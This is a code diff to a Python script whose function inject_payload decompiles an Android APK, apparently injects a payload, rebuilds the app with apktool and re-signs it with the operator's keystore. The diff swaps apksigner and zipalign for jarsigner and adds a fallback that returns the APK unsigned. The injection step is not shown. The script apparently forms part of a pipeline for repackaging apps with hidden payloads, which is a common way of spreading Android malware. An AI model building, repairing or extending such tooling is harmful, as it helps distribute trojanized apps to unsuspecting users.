@@ -34,9 +34,9 @@ except Exception as e:
 
 
 def check_tools():
-    for tool in ["apktool", "zipalign", "apksigner", "jarsigner", "keytool"]:
+    for tool in ["apktool", "jarsigner", "keytool"]:
         try:
-            subprocess.run([tool, "--help"], capture_output=True, timeout=5)
+            subprocess.run([tool], capture_output=True, timeout=5)
             logger.info(f"Tool OK: {tool}")
         except FileNotFoundError:
             logger.warning(f"Tool MISSING: {tool}")
@@ -59,8 +59,7 @@ def inject_payload(apk_bytes):
         with tempfile.TemporaryDirectory() as tmpdir:
             tmp_path = Path(tmpdir)
             input_apk = tmp_path / "input.apk"
-            unsigned_apk = tmp_path / "unsigned.apk"
-            aligned_apk = tmp_path / "aligned.apk"
+            output_apk = tmp_path / "output.apk"
             signed_apk = tmp_path / "signed.apk"
             decompiled_dir = tmp_path / "decompiled"
 
@@ -86,68 +85,42 @@ def inject_payload(apk_bytes):
             # STEP 3: Rebuild APK
             logger.info("Rebuilding APK...")
             if not run_cmd(
-                ["apktool", "b", "-o", str(unsigned_apk), str(decompiled_dir)],
+                ["apktool", "b", "-o", str(output_apk), str(decompiled_dir)],
                 "rebuild"
             ):
                 return None
 
-            if not unsigned_apk.exists():
+            if not output_apk.exists():
                 logger.error("Rebuilt APK not found")
                 return None
 
-            # STEP 4: Zipalign
-            logger.info("Zipaligning APK...")
-            if not run_cmd(
-                ["zipalign", "-f", "4", str(unsigned_apk), str(aligned_apk)],
-                "zipalign"
-            ):
-                # If zipalign fails, try without it (still better than nothing)
-                logger.warning("Zipalign failed, signing without alignment")
-                aligned_apk = unsigned_apk
-
-            # STEP 5: Sign APK
+            # STEP 4: Sign APK with jarsigner
             if KEYSTORE_PATH:
-                logger.info("Signing APK with apksigner...")
+                logger.info("Signing APK with jarsigner...")
                 sign_ok = run_cmd(
                     [
-                        "apksigner", "sign",
-                        "--ks", KEYSTORE_PATH,
-                        "--ks-pass", f"pass:{KEYSTORE_PASS}",
-                        "--key-pass", f"pass:{KEYSTORE_PASS}",
-                        "--out", str(signed_apk),
-                        str(aligned_apk),
+                        "jarsigner",
+                        "-keystore", KEYSTORE_PATH,
+                        "-storepass", KEYSTORE_PASS,
+                        "-keypass", KEYSTORE_PASS,
+                        "-signedjar", str(signed_apk),
+                        str(output_apk),
+                        "release",
                     ],
                     "sign"
                 )
 
-                # Fallback: use jarsigner if apksigner fails
-                if not sign_ok or not signed_apk.exists():
-                    logger.warning("apksigner failed, trying jarsigner fallback...")
-                    jarsigner_apk = tmp_path / "jarsigned.apk"
-                    sign_ok = run_cmd(
-                        [
-                            "jarsigner",
-                            "-keystore", KEYSTORE_PATH,
-                            "-storepass", KEYSTORE_PASS,
-                            "-keypass", KEYSTORE_PASS,
-                            str(aligned_apk),
-                            "release",
-                        ],
-                        "jarsigner"
-                    )
-                    if sign_ok:
-                        import shutil
-                        shutil.copy2(aligned_apk, signed_apk)
+                if sign_ok and signed_apk.exists():
+                    with open(signed_apk, "rb") as f:
+                        return f.read()
 
-                if not sign_ok or not signed_apk.exists():
-                    logger.error("All signing methods failed")
-                    return None
-
-                with open(signed_apk, "rb") as f:
+                # Fallback: return unsigned if signing fails
+                logger.warning("Signing failed, returning unsigned APK")
+                with open(output_apk, "rb") as f:
                     return f.read()
             else:
                 logger.warning("No keystore found, returning unsigned APK")
-                with open(aligned_apk, "rb") as f:
+                with open(output_apk, "rb") as f:
                     return f.read()
 
     except Exception as e:
